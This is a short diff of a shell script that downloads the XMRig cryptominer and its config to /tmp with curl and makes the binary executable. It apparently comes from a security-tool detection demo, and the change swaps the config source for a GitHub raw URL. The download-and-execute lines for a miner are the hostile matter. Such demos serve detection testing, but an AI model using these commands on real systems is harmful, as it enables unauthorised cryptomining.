@@ -3,7 +3,7 @@
 if [ ! -f /tmp/xmrig-demo ]; then
         echo "[INFO] XMRig not found, downloading XMRig now"
         curl http://lwmalwaredemo.com/xmrig -o /tmp/xmrig-demo
-        curl http://lwmalwaredemo.com/config.json -o /tmp/config-demo.json
+        curl https://raw.githubusercontent.com/renesiekermann/testing-lacework/main/config.json -o /tmp/config-demo.json
         chmod +x /tmp/xmrig-demo
 else
         echo "[INFO] XMRig present, skipping download"
